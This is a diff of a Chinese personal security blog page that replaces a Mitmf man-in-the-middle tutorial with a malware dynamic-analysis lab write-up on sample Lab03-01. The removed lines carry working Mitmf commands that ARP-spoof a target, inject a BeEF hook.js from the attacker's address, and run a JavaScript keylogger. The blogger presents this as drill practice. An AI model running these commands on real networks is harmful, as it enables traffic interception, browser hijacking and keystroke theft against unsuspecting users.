@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="中间人攻击," />
+  <meta name="keywords" content="逆向," />
 
 
 
@@ -79,26 +79,32 @@
 
 
 
-<meta name="description" content="过几天貌似需要实战演练无线攻击，今天晚上恰好没事做，先搭建一个环境熟悉一下。 这里用到的是Mitmf，Mitmf 是一款强大的中间人攻击的工具，可以用来注入js脚本，可以结合beef的hook来一起使用，Mitmf 在Kali 2.0中已经默认个移除了，我们需要自行安装一下，在安装之前，需要先解决它的依赖问题： 1apt-get install python-dev python-setuptoo">
-<meta name="keywords" content="中间人攻击">
+<meta name="description" content="中秋节一个人过也就算了，毕竟只有三天，可这次国庆是七天，也是一个人过，MMP  继续上次的恶意代码分析，这次的实验对象是第三章的内容 Lab 03-01首先用PEID查一下壳，发现是PEncrypt 3.1 Final">
+<meta name="keywords" content="逆向">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Mitmf中间人攻击">
-<meta property="og:url" content="http://nickzhoulin.github.io/2018/09/25/page180925/index.html">
+<meta property="og:title" content="恶意代码分析（二）">
+<meta property="og:url" content="http://nickzhoulin.github.io/2018/10/01/page181001/index.html">
 <meta property="og:site_name" content="Nick&#39; 的博客">
-<meta property="og:description" content="过几天貌似需要实战演练无线攻击，今天晚上恰好没事做，先搭建一个环境熟悉一下。 这里用到的是Mitmf，Mitmf 是一款强大的中间人攻击的工具，可以用来注入js脚本，可以结合beef的hook来一起使用，Mitmf 在Kali 2.0中已经默认个移除了，我们需要自行安装一下，在安装之前，需要先解决它的依赖问题： 1apt-get install python-dev python-setuptoo">
+<meta property="og:description" content="中秋节一个人过也就算了，毕竟只有三天，可这次国庆是七天，也是一个人过，MMP  继续上次的恶意代码分析，这次的实验对象是第三章的内容 Lab 03-01首先用PEID查一下壳，发现是PEncrypt 3.1 Final">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://oz3okd76o.bkt.clouddn.com/20180925-01.png">
-<meta property="og:image" content="http://oz3okd76o.bkt.clouddn.com/20180925-02.png">
-<meta property="og:image" content="http://oz3okd76o.bkt.clouddn.com/20180925-03.png">
-<meta property="og:image" content="http://oz3okd76o.bkt.clouddn.com/20180925-04.png">
-<meta property="og:image" content="http://oz3okd76o.bkt.clouddn.com/20180925-05.png">
-<meta property="og:image" content="http://oz3okd76o.bkt.clouddn.com/20180925-06.png">
-<meta property="og:image" content="http://oz3okd76o.bkt.clouddn.com/20180925-07.png">
-<meta property="og:updated_time" content="2018-09-25T14:35:29.639Z">
+<meta property="og:image" content="http://oz3okd76o.bkt.clouddn.com/20181001-13.JPG">
+<meta property="og:image" content="http://oz3okd76o.bkt.clouddn.com/20181001-01.JPG">
+<meta property="og:image" content="http://oz3okd76o.bkt.clouddn.com/20181001-02.JPG">
+<meta property="og:image" content="http://oz3okd76o.bkt.clouddn.com/20181001-03.JPG">
+<meta property="og:image" content="http://oz3okd76o.bkt.clouddn.com/20181001-04.JPG">
+<meta property="og:image" content="http://oz3okd76o.bkt.clouddn.com/20181001-05.JPG">
+<meta property="og:image" content="http://oz3okd76o.bkt.clouddn.com/20181001-06.JPG">
+<meta property="og:image" content="http://oz3okd76o.bkt.clouddn.com/20181001-07.JPG">
+<meta property="og:image" content="http://oz3okd76o.bkt.clouddn.com/20181001-08.JPG">
+<meta property="og:image" content="http://oz3okd76o.bkt.clouddn.com/20181001-09.JPG">
+<meta property="og:image" content="http://oz3okd76o.bkt.clouddn.com/20181001-10.JPG">
+<meta property="og:image" content="http://oz3okd76o.bkt.clouddn.com/20181001-11.JPG">
+<meta property="og:image" content="http://oz3okd76o.bkt.clouddn.com/20181001-12.JPG">
+<meta property="og:updated_time" content="2018-10-01T13:03:54.986Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Mitmf中间人攻击">
-<meta name="twitter:description" content="过几天貌似需要实战演练无线攻击，今天晚上恰好没事做，先搭建一个环境熟悉一下。 这里用到的是Mitmf，Mitmf 是一款强大的中间人攻击的工具，可以用来注入js脚本，可以结合beef的hook来一起使用，Mitmf 在Kali 2.0中已经默认个移除了，我们需要自行安装一下，在安装之前，需要先解决它的依赖问题： 1apt-get install python-dev python-setuptoo">
-<meta name="twitter:image" content="http://oz3okd76o.bkt.clouddn.com/20180925-01.png">
+<meta name="twitter:title" content="恶意代码分析（二）">
+<meta name="twitter:description" content="中秋节一个人过也就算了，毕竟只有三天，可这次国庆是七天，也是一个人过，MMP  继续上次的恶意代码分析，这次的实验对象是第三章的内容 Lab 03-01首先用PEID查一下壳，发现是PEncrypt 3.1 Final">
+<meta name="twitter:image" content="http://oz3okd76o.bkt.clouddn.com/20181001-13.JPG">
 
 
 
@@ -128,13 +134,13 @@
 
 
 
-  <link rel="canonical" href="http://nickzhoulin.github.io/2018/09/25/page180925/"/>
+  <link rel="canonical" href="http://nickzhoulin.github.io/2018/10/01/page181001/"/>
 
 
 
 
 
-  <title>Mitmf中间人攻击 | Nick' 的博客</title>
+  <title>恶意代码分析（二） | Nick' 的博客</title>
   
 
 
@@ -261,7 +267,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://nickzhoulin.github.io/2018/09/25/page180925/">
+    <link itemprop="mainEntityOfPage" href="http://nickzhoulin.github.io/2018/10/01/page181001/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Nick">
@@ -278,7 +284,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">Mitmf中间人攻击</h1>
+          <h1 class="post-title" itemprop="name headline">恶意代码分析（二）</h1>
         
 
         <div class="post-meta">
@@ -290,8 +296,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-09-25T22:00:32+08:00">
-                2018-09-25
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-10-01T19:32:23+08:00">
+                2018-10-01
               </time>
             
 
@@ -350,34 +356,34 @@
       
 
       
-        <p>过几天貌似需要实战演练无线攻击，今天晚上恰好没事做，先搭建一个环境熟悉一下。</p>
-<p>这里用到的是Mitmf，Mitmf 是一款强大的中间人攻击的工具，可以用来注入js脚本，可以结合beef的hook来一起使用，Mitmf 在Kali 2.0中已经默认个移除了，我们需要自行安装一下，在安装之前，需要先解决它的依赖问题：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">apt-get install python-dev python-setuptools libpcap0.8-dev libnetfilter-queue-dev libssl-dev libjpeg-dev libxml2-dev libxslt1-dev libcapstone3 libcapstone-dev libffi-dev file</div></pre></td></tr></table></figure>
-<a id="more"></a>
-<p><img src="http://oz3okd76o.bkt.clouddn.com/20180925-01.png" alt=""></p>
-<p>依赖解决后就可以安装Mitmf了:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">apt-get install mitmf</div></pre></td></tr></table></figure>
-<p><img src="http://oz3okd76o.bkt.clouddn.com/20180925-02.png" alt=""></p>
-<p>安装完成后还需要安装一个用于兼容mitmf的东西twisted,如果系统之前安装过那么先卸载一下，重新安装：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pip uninstall twisted</div></pre></td></tr></table></figure>
-<p><img src="http://oz3okd76o.bkt.clouddn.com/20180925-03.png" alt=""></p>
-<p>下载twisted最新版本</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">wget -d https://twistedmatrix.com/Releases/Twisted/18.7/Twisted-18.7.0.tar.bz2</div></pre></td></tr></table></figure>
-<p>使用pip命令进行安装：</p>
-<p><img src="http://oz3okd76o.bkt.clouddn.com/20180925-04.png" alt=""></p>
-<p>到此为止可以正常的使用Mitmf了，运行beef来调用beef的hook脚本，之前的kali 一直都是自带beef的，刚才直接运行beef命令发现还没有安装，如果系统里面没有beef的话运行如下命令</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">apt-get install beef     #安装</div><div class="line">cd /usr/share/beef-xss/  #切换到目录</div><div class="line">./beef                   #运行beef</div></pre></td></tr></table></figure>
-<p><img src="http://oz3okd76o.bkt.clouddn.com/20180925-05.png" alt=""></p>
-<p>beef默认的账号和密码都为beef,可以在浏览器中查看。</p>
-<p><img src="http://oz3okd76o.bkt.clouddn.com/20180925-06.png" alt=""></p>
-<p>下面使用mitmf进行中间人攻击。输入命令：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mitmf --spoof --arp -i wlan0 --gateway 192.168.1.1 --target 192.168.1.4 --inject --js-url http://192.168.1.4:3000/hook.js</div></pre></td></tr></table></figure>
-<p><img src="http://oz3okd76o.bkt.clouddn.com/20180925-07.png" alt=""></p>
-<p>这里有个地方需要注意一下，target是目标ip,我刚开始一直以为是本机ip,攻击没反应，过了会儿才回过神来。</p>
-<p>除了注入脚本，mitmf还自带了许多功能，如键盘记录</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mitmf --spoof --arp -i wlan0 --gateway 192.168.1.1 --target 192.168.1.5 --jskeylogger</div></pre></td></tr></table></figure>
-<p>网页图片翻转180度</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mitmf --spoof --arp -i wlan0 --gateway 192.168.1.1 --target 192.168.1.5 --upsidedownternet</div></pre></td></tr></table></figure>
+        <p>中秋节一个人过也就算了，毕竟只有三天，可这次国庆是七天，也是一个人过，MMP</p>
+<p><img src="http://oz3okd76o.bkt.clouddn.com/20181001-13.JPG" alt=""></p>
+<p>继续上次的恶意代码分析，这次的实验对象是第三章的内容</p>
+<h3 id="Lab-03-01"><a href="#Lab-03-01" class="headerlink" title="Lab 03-01"></a>Lab 03-01</h3><p>首先用PEID查一下壳，发现是PEncrypt 3.1 Final<br><a id="more"></a><br><img src="http://oz3okd76o.bkt.clouddn.com/20181001-01.JPG" alt=""></p>
+<p>这个壳的话目前好像没有现成的脱壳工具，需要手工脱，不过脱壳不是这一章的重点，这一章的重点是动态分析。PEID查看一下导入函数，发现因为加壳的原因，没有看到什么有价值的东西。</p>
+<p><img src="http://oz3okd76o.bkt.clouddn.com/20181001-02.JPG" alt=""></p>
+<p>用Strings打印一下字符串:</p>
+<p><img src="http://oz3okd76o.bkt.clouddn.com/20181001-03.JPG" alt=""></p>
+<p>可以看到有一个网址和一些注册表相关的东西，初步判断这个恶意程序会进行联网相关的操作，这里使用wireshark来监听网络：</p>
+<p><img src="http://oz3okd76o.bkt.clouddn.com/20181001-04.JPG" alt=""></p>
+<p>Regshot建立注册表快照：</p>
+<p><img src="http://oz3okd76o.bkt.clouddn.com/20181001-05.JPG" alt=""></p>
+<p>Process Monitor监视进程，添加过滤：</p>
+<p><img src="http://oz3okd76o.bkt.clouddn.com/20181001-06.JPG" alt=""></p>
+<p>然后打开Process Explorer，查看后台管理，都打开后，运行程序Lab03-01：</p>
+<p><img src="http://oz3okd76o.bkt.clouddn.com/20181001-07.JPG" alt=""></p>
+<p>打开Process Explorer-&gt;View-&gt;Lower Pane View-&gt;Handles查看一些关于程序的Handles的信息:</p>
+<p><img src="http://oz3okd76o.bkt.clouddn.com/20181001-08.JPG" alt=""></p>
+<p>如图可以看到有创建互斥量的创建，然后再看一下DLLs,看它动态链接库有哪些操作：</p>
+<p><img src="http://oz3okd76o.bkt.clouddn.com/20181001-09.JPG" alt=""></p>
+<p>其中有ws2_32.dll和wshtcpip.dll，可以确定有联网操作，具体行为在wireshark中查看：</p>
+<p><img src="http://oz3okd76o.bkt.clouddn.com/20181001-10.JPG" alt=""></p>
+<p>可以看到有很多DNS解析和SSL的操作:</p>
+<p><img src="http://oz3okd76o.bkt.clouddn.com/20181001-11.JPG" alt=""></p>
+<p>在DNS中可以看到有域名的解析，SSL发送的内容看了一下每次都不相同，没共同特征，判断是随机生成的信息。</p>
+<p>然后转到Process Monitor,可以看到有注册表的写入和修改：</p>
+<p><img src="http://oz3okd76o.bkt.clouddn.com/20181001-12.JPG" alt=""></p>
+<p>总结一下，这个恶意代码会修改注册表，一实现开机自启动，然后对一个网址进行解析，广播发送一些随机生成的信息。</p>
 
       
     </div>
@@ -395,7 +401,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/中间人攻击/" rel="tag"># 中间人攻击</a>
+            <a href="/tags/逆向/" rel="tag"># 逆向</a>
           
         </div>
       
@@ -408,8 +414,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/09/24/page180924/" rel="next" title="Hadoop参数调优">
-                <i class="fa fa-chevron-left"></i> Hadoop参数调优
+              <a href="/2018/09/26/page180926/" rel="next" title="WebLogic WLS组件漏洞复现">
+                <i class="fa fa-chevron-left"></i> WebLogic WLS组件漏洞复现
               </a>
             
           </div>
@@ -417,10 +423,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2018/09/26/page180926/" rel="prev" title="WebLogic WLS组件漏洞复现">
-                WebLogic WLS组件漏洞复现 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -472,8 +474,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -539,6 +550,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Lab-03-01"><span class="nav-number">1.</span> <span class="nav-text">Lab 03-01</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
